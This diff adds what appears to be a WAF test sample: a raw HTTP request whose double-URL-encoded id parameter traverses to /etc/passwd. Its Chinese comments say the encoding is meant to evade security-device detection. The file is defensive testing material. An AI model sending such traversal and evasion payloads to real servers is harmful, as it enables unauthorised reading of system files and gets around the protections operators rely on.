@@ -1,0 +1,9 @@
+# 文件包含_URL编码
+# 对payload进行url编码以达到绕过安全设备检测的目的
+GET /?id=%252e%252e%252f%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564&bid=hd_tag_m8mv2542 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2542
+RM-PRO-Token: 9825a87be11a342a5b71a3af9c1374a9
+RM-PRO-Time: 1742808437720
+User-Agent: curl/7.83.1
+
